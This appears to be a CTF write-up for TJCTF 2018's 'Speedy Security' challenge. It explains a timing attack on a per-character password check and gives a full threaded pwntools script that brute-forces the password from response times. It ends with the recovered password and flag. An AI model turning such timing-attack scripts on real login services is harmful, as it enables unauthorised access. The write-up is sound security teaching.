---
title: Speedy Security
contest: TJCTF 2018
authors: GabiTulba
layout: writeup
---

## Problem statement:
>I hear there's a flag hiding behind this new service, Speedy Security(TM). Can you find it?
>nc problem1.tjctf.org 8003

<br>

## My opinion:
The idea of this problem was pretty simple, perform a timing attack on a password checker. Easier said than done if you ask me. 
<br><br>

## The challenge:
Connecting through netcat on the server we get the following message:
```
Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
How many times would you like us to check each character of your password?
1
Please enter your password:
1
Authorization failed!
```

<br>

Ok so practically, we have a program that looks like this, or somewhat like this:

```python
def check(input,checks):
	password='thisisthepassword'
	for x in zip(input,password):
		for i in range(checks):
			if(x[0]!=x[1]):
				return 'Authorization failed!'
	return 'flag'
```

<br>

I know it's a wild guess, but after some trial and error that's what I came up with. <br>
Now, it's pretty simple how a [timing attack](https://en.wikipedia.org/wiki/Timing_attack) would work. <br> 
Try for a big number of checks (`10**6` worked for me) for each character of the password all possible characters and choose the one that took the most time to compute. Easy right? Not really, the server had some latency and sometimes it would freeze for a couple seconds. So you couldn't really guess the password in one go, also multithreading saved my life here. One more thing that was essential was to take the average of a few queries (`5` in this case was enough) in order to avoid the server's random latency.

## Getting the password:
I used the following code to get the password, but I had to restart it a few times with the last correct part of the password. I also asked the author for the length of the password, it was 32.<br>
Also, after geting the first 5 characters of the password I took another wild guess assuming the password would be made of alphanumerical characters.<br>

```python
from threading import Thread
from pwn import *
from time import time,sleep
CHECKS='1000000'
steps=5
PASS=''
S=[0 for i in range(256)]
pr='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890++'
pr=[ord(x) for x in pr]
def g(p):
	S[p]=0
	print chr(p)
	L=[Thread(target=f,args=(p,)) for i in range(steps)]
	for x in L:
		x.start()
	for x in L:
		x.join()
	S[p]/=steps
	
def f(p):
	s=remote('problem1.tjctf.org','8003')
	s.recvuntil('password?')
	s.sendline(CHECKS)
	s.recvuntil(':')
	x=time()
	s.sendline(PASS+chr(p)+'\x00'*(499-len(PASS)))
	s.recvuntil('failed!')
	y=time()
	S[p]+=y-x
	s.close()

while(1):
	for i in range(0,len(pr),8):
		W=[Thread(target=g,args=(pr[j],)) for j in range(i,i+8)]
		for R in W:
			R.start()
		for R in W:
			R.join()
	l=S
	l=[(l[pr[i]],chr(pr[i])) for i in range(len(pr))]
	print list(reversed(sorted(l)))
	l=list(reversed(sorted(l)))
	p=0
	while(l[p][1]=='+'):
		p+=1
	PASS+=l[p][1]
	print PASS
```

<br>

so the password was: **TkVWM3IgZ29OTjQgRzF2MyB5MHUgdVAK** <br>

```
Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
How many times would you like us to check each character of your password?
1
Please enter your password:
TkVWM3IgZ29OTjQgRzF2MyB5MHUgdVAK
Successfully authorized.
Welcome back, [[ EVAN ]]
Your flag is  tjctf{char_chks_c4n_b3_SLOW}
```

<br>

Flag: **tjctf{char_chks_c4n_b3_SLOW}**
